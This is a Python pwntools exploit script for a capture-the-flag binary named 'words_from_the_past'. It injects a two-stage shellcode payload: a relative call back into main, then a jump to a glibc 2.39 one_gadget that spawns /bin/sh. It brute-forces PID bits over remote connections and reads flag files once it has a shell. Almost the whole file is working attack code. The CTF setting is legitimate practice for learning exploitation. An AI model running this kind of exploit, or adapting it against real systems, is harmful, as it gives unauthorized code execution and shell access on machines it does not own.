#!/usr/bin/env python3
from pathlib import Path
from time import sleep

from pwn import *


context.arch = "amd64"
context.binary = ELF("./challenge/words_from_the_past", checksec=False)

HINT = b"Precise moves, keep it fast and lethal..\n"
MARKER = b"__WFTP_SHELL__"

# The first mmap hint is main+0x10000.  Linux page-aligns that to PIE+0x11000.
# A rel32 call from there reaches main at PIE+0x16d5.
STAGE1 = b"\xe8" + p32((-0xF930) & 0xFFFFFFFF)

# Ubuntu glibc 2.39's rcx==NULL/rbx==NULL posix_spawn("/bin/sh") gadget.
ONE_GADGET = 0x583F3


def stage2(pid_low_bits):
    distance_to_libc = (0x1000 + pid_low_bits) << 12
    displacement = distance_to_libc + ONE_GADGET - 5
    return b"\xe9" + p32(displacement)


def start():
    if args.REMOTE:
        return remote(args.HOST or "127.0.0.1", int(args.PORT or 1337))
    return process(
        context.binary.path,
        cwd=str(Path(context.binary.path).parent),
        stdin=PIPE,
        stdout=PIPE,
    )


def get_local_child_pid(io):
    children_file = Path(f"/proc/{io.pid}/task/{io.pid}/children")
    for _ in range(100):
        children = children_file.read_text().split()
        if children:
            return int(children[0])
        sleep(0.01)
    raise RuntimeError("could not find the forked challenge process")


def exploit(io, pid_low_bits):
    io.recvuntil(HINT, timeout=5)
    io.send(STAGE1)

    # One hint is printed before STAGE1 executes and another by recursive main.
    io.recvuntil(HINT, timeout=5)
    io.recvuntil(HINT, timeout=5)

    io.send(stage2(pid_low_bits))
    io.sendline(b"echo " + MARKER)
    output = io.recvuntil(MARKER, timeout=3)
    return MARKER in output


if args.REMOTE:
    # The second mmap gap contains getpid()&7.  With no PID disclosure, vary the
    # three-bit guess over fresh socat connections.  The changing guess also
    # covers the usual +2 PID stride caused by socat and the challenge's fork.
    for attempt in range(int(args.ATTEMPTS or 32)):
        guess = attempt & 7
        io = start()
        try:
            log.info(f"attempt {attempt + 1}: guessing getpid() & 7 == {guess}")
            if exploit(io, guess):
                log.success(f"shell obtained with PID low bits {guess}")
                io.sendline(b"cat flag* /flag* 2>/dev/null")
                io.interactive()
                break
        except (EOFError, PwnlibException):
            pass
        io.close()
    else:
        log.failure("all PID guesses failed")
else:
    io = start()
    io.recvuntil(HINT, timeout=5)
    child_pid = get_local_child_pid(io)

    # exploit() normally consumes the first banner; it has already been consumed
    # here so that the actual forked PID could be read from procfs.
    io.unrecv(HINT)
    log.info(f"local child PID: {child_pid} (low bits {child_pid & 7})")
    if not exploit(io, child_pid & 7):
        raise RuntimeError("local exploit failed")
    log.success("shell obtained")
    io.interactive()
